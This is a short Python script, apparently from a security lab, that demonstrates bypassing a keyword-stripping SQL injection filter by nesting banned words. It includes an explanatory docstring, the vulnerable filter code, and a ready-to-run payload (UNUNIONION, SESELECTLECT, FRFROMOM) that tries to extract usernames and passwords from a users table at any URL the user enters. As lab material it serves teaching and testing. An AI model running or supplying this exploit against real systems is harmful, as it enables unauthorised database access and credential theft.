import requests
'''in this lab following line removing keywords like union select and from. It can be bypassed using Nesting Stripped Expressions

Some sanitizing filters strip certain characters or expressions from user input, and then process the remaining data in the usual way.
If an expression that is being stripped contains two or more characters, and the filter is not applied recursively, 
you can normally defeat the filter by nesting the banned expression inside itself.
For example, if the SQL keyword SELECT is being stripped from your input, you can use the following input to defeat the filter:

SELSELECTECT
https://code.google.com/archive/p/teenage-mutant-ninja-turtles/wikis/AdvancedObfuscation.wiki
# Block common SQL injection keywords 
forbidden_keywords = ["union", "select", "from"]
for keyword in forbidden_keywords:
    query = re.sub(keyword, "", query, flags=re.IGNORECASE)
 '''
payload = { "user": "admin'/**/UNUNIONION/**/SESELECTLECT/**/username,/**/password,/**/NULL/**/FRFROMOM/**/users--"}
print("Enter url:")
url = input()
get_response = requests.get(url, params=payload)
print ("SQL Injection");
# Printing only the status code
print(get_response.content)
